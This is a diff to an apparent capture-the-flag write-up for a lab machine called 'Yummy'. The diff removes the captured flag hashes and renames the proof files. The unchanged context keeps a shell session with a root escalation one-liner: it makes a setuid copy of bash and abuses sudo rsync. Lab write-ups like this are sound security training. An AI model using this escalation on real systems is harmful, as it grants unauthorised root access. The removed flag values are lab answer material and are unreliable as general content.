@@ -1,7 +1,7 @@
 ---
 title: Yummy
 slug: Yummy
-tags: [Linux, Vulnerability Research]
+tags: [Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -617,9 +617,8 @@ Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
 applicable law.
 
 qa@yummy:~$ ls
-user.txt
-qa@yummy:~$ cat user.txt
-0e9c5711f433348b9373963259f9f33d
+local-proof.txt
+qa@yummy:~$ cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -702,8 +701,7 @@ cp /bin/bash app-production/bash;chmod u+s app-production/bash;sudo /usr/bin/rsy
 
 whoami
 root
-cat /root/root.txt
-d16278962433b70748203a15d382ef41
+cat /root/privileged-proof.txt
 ```
 
 ---
